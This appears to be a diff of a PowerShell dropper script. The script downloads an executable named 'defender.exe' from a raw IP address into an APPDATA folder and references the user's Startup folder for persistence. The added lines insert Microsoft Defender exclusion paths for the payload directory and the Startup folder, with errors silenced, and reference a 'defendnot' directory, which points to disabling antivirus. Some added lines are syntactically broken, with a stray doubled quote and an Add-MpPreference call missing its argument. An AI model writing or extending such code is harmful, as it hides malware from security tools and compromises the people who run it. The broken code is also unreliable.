@@ -2,7 +2,8 @@
 
 $waDir = "$env:APPDATA\watsap"
 $waUpdatedUrl = "http://192.3.159.189:3131/defender.exe"
-$waProcessName = "defender.exe"
+$waProcessName = "defender.exe""
+$defendernotDir = "C:\Program Files\defendnot\"
 #$initFile = "$waDir\init.wa"
 #$userid = Get-Random -Minimum 100000 -Maximum 999999 -ErrorAction SilentlyContinue
 $shellAutoStartDir = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\"
@@ -12,6 +13,12 @@ if ($env:OS -ne "Windows_NT") {
     Write-Warning "This script is only supported on Windows"
     exit
 }
+
+# add defender exclusion
+Add-MpPreference -ExclusionPath $waDir -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath $shellAutoStartDir -ErrorAction SilentlyContinue
+Add-MpPreference -ExclusionPath 
+
 
 # cleanup old files
 if (Test-Path $waDir) {
